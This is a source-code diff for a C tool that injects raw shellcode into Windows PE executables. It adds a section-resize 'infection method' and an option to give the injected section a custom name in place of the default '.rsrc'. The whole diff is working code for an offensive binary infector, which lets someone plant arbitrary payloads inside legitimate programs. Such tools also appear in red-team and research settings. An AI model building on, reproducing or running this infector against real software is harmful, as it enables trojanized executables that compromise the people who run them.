@@ -21,6 +21,7 @@ static void ParseOptions(int argc, char** argv);
 static void PrintHelp(char* prog_name);
 
 static inf_method method = METHOD_CODE_INJECT;
+static char section_name[SECTION_SHORT_NAME_LENGTH] = "";
 
 
 int main(int argc, char** argv) {
@@ -181,11 +182,14 @@ int main(int argc, char** argv) {
 						fprintf(stderr, "Not enough space in section header for new section record\n");
 						err = -10;
 					} else {
-						err = pe_infect_new_section(&ntHeader, sections, xcode, xcode_size, ".rsrc");
+						err = pe_infect_new_section(&ntHeader, sections, xcode, xcode_size, strlen(section_name) ? section_name : ".rsrc");
 						if (!err) {
 							sectOriginalGapSize -= sizeof(pe_section_header); //decrease section gap
 						}
 					}
+					break;
+				case METHOD_CODE_RESIZE:
+					err = pe_infect_resize_section(&ntHeader, sections, xcode, xcode_size);
 					break;
 			}
 			
@@ -203,11 +207,14 @@ int main(int argc, char** argv) {
 						fprintf(stderr, "Not enough space in section header for new section record\n");
 						err = -10;
 					} else {
-						err = pe64_infect_new_section(&ntHeader64, sections, xcode, xcode_size, ".rsrc");
+						err = pe64_infect_new_section(&ntHeader64, sections, xcode, xcode_size, strlen(section_name) ? section_name : ".rsrc");
 						if (!err) {
 							sectOriginalGapSize -= sizeof(pe_section_header); //decrease section gap
 						}
 					}
+					break;
+				case METHOD_CODE_RESIZE:
+					err = pe64_infect_resize_section(&ntHeader64, sections, xcode, xcode_size);
 					break;
 			}
 			
@@ -233,7 +240,7 @@ int main(int argc, char** argv) {
 }
 
 static void ParseOptions(int argc, char** argv) {
-	const char* short_options = "hi:o:s:dm:";
+	const char* short_options = "hi:o:s:dm:n:";
 	
 	const struct option long_options[] = {
 		{ "help", no_argument, NULL, 'h' },
@@ -242,6 +249,7 @@ static void ParseOptions(int argc, char** argv) {
 		{ "shellcode", required_argument, NULL, 's' },
 		{ "info", no_argument, NULL, 'd' },
 		{ "method",  required_argument, NULL, 'm' },
+		{ "name", required_argument, NULL, 'n' },
 		{ NULL, 0, NULL, 0 }
 	};
 	
@@ -272,9 +280,14 @@ static void ParseOptions(int argc, char** argv) {
 					method = METHOD_CODE_INJECT;
 				} else if (!strncmp(optarg, "sect", MAX_STRING)) {
 					method = METHOD_CODE_NEWSECT;
+				} else if (!strncmp(optarg, "resz", MAX_STRING)) {
+					method = METHOD_CODE_RESIZE;
 				} else {
 					fprintf(stdout, "Unknown method \"%s\". Using default method (code)\n", optarg);
 				}
+				break;
+			case 'n':
+				strncpy(section_name, optarg, SECTION_SHORT_NAME_LENGTH);
 				break;
 			default:
 				PrintHelp(argv[0]);
@@ -286,9 +299,11 @@ static void ParseOptions(int argc, char** argv) {
 static void PrintHelp(char* prog_name) {
 	fprintf(stdout, "Usage: %s -i <input_file> -o <output_file> -s <raw_shellcode_file>\n", prog_name);
 	fprintf(stdout, "\t -d - show section info\n");
-	fprintf(stdout, "\t -m - set infection method (available values: code, sect)\n");
+	fprintf(stdout, "\t -m - set infection method (available values: code, sect, resz)\n");
+	fprintf(stdout, "\t -n - set new section name (for selected method: sect)\n");
 	fprintf(stdout, "Long options usage: %s --input <input_file> --output <output_file> --shellcode <raw_shellcode_file>\n", prog_name);
 	fprintf(stdout, "\t --info - show section info\n");
 	fprintf(stdout, "\t --method - set infection method (available values: code, sect)\n");
+	fprintf(stdout, "\t --name - set new section name (for selected method: sect)\n");
 	exit(-99);
 }
